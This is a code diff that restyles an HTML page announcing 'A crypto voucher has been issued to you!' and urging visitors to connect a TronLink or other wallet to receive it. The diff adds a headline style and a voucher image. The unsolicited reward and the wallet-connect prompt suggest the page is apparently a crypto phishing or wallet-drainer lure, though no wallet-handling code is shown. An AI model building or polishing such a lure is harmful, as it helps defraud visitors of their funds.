@@ -16,6 +16,8 @@
   .net { font-size: 12px; color: var(--mut); border: 1px solid #1b3a2a; padding: 5px 10px; border-radius: 999px; }
   main { width: 100%; max-width: 520px; padding: 6px 20px 40px; }
   h1 { font-size: 27px; line-height: 1.2; margin: 14px 0 8px; }
+  .headline { white-space: nowrap; font-size: clamp(13px, 3.6vw, 21px); letter-spacing: -0.3px; }
+  .voucher { width: 100%; display: block; border-radius: 14px; margin: 0 0 18px; }
   .sub { color: var(--mut); font-size: 15px; margin-bottom: 22px; }
   .amount { border: 1px solid #1b3a2a; border-radius: 18px; padding: 20px; background: linear-gradient(180deg, #0b1f15, #08170f); margin-bottom: 18px; }
   .amount .lbl { font-size: 12px; letter-spacing: .12em; text-transform: uppercase; color: var(--mut); }
@@ -53,8 +55,9 @@
 
 <main>
   <div id="view-connect">
-    <h1>A crypto voucher has been issued to you!</h1>
+    <h1 class="headline">A crypto voucher has been issued to you!</h1>
     <div class="sub">Connect your wallet to receive it. TronRewards never requests private keys.</div>
+    <img class="voucher" src="voucher.png" alt="" onerror="this.style.display='none'">
     <button class="cta" id="connect-tl">Connect TronLink</button>
     <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
     <div class="status" id="cstatus"></div>
